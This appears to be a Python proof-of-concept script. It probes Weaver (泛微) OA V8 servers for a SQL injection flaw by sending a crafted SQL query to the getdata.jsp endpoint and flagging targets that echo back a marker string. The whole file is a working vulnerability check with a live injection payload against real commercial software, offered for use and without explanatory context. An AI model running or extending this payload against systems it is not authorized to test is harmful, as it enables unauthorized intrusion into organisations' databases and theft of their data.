import httpx
from lib.get_normal_url import get_standard_url
headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
}

def poc(target):
    try:
        target = get_standard_url(target)
        url = target + '/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select+6412121cbb2dc2cb9e460cfee7046be+as+id'
        req = httpx.get(url,headers=headers)
        if "6412121cbb2dc2cb9e460cfee7046be" in req.text and req.status_code == 200:
            print("\033[0;31m 泛微OA V8 SQL注入漏洞："+ url )
    except:
        pass


